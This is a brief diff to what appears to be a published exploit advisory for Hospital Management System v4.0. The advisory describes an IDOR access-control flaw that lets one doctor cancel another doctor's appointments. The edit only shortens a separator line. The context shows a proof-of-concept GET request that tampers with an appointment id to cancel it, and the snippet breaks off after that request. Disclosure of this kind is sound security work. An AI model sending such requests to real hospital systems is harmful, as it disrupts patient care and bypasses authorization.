@@ -7,7 +7,7 @@
 ## Exploit Description:
 ## Hospital Management System v4.0 suffers from IDOR - Broken Access Control Vulnerability allowing attacker doctor to cancel the appointment that is managed by other doctor(horizontal privilege escalation).
 
-## -----------------------------------------------POC-------------------------------------------------------------------
+## ---------------------------------POC-----------------------------
 ```
 GET /hospital/hms/doctor/appointment-history.php?id=3(CHANGE HERE)&cancel=update HTTP/1.1
 ...
